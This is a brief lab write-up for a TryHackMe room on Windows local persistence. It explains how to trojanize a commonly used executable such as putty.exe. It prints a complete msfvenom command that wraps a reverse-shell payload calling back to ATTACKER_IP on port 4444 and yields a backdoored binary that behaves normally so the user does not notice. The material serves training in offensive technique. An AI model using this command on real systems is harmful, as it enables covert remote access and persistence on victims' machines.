## Room : [Windows Local Persistence - Backdooring Files](https://tryhackme.com/room/windowslocalpersistence)

This room shows how we can make a backdoor using the files users interact with regularly and also making sure the files react as expected. This will make sure we dont blow our cover.

If you see any user with having executables on their desktop, the chances are high that they use it very often. We will plant an exploit using `msfvenom`. For example, we will use putty.exe here. Create a backdoored version of the exe that will also start an extra binary thread. Using the command:

`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe`

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it.
